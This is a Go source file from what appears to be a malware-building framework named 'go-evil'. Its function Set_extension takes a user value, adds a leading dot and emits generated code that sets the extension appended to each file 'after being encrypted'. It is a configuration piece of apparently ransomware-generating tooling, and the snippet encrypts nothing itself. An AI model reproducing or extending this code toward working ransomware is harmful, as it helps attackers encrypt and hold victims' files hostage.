package configuration

import (
	"fmt"

	"github.com/TeamPhoneix/go-evil/utility/structure"
	"github.com/TeamPhoneix/go-evil/utility/tools"
)

// This functions sets the extension that each file will have after being encrypted
func Set_extension(value string, s_json string) ([]string, string) {
	data_object := structure.Receive(s_json)

	system_call := "set_extension"
	value = tools.Erase_delimiter(value, []string{"\"", " "}, -1)

	result := tools.Starts_with(value, []string{"."})
	if ok := result["."]; !ok { // It does not contain a dot
		value = fmt.Sprintf(".%s", value) // So add it
	}

	data_object.Add_go_function([]string{
		fmt.Sprintf("func %s(repr []int){", system_call),
		"target := spine.variable.get(spine.alpha.construct_string(repr))",
		"spine.crypt.extension = target",
		"}"})

	// Construct our int array
	parameter := data_object.Generate_int_array_parameter(value)

	return []string{fmt.Sprintf("%s(%s)", system_call, parameter)}, structure.Send(data_object)
}
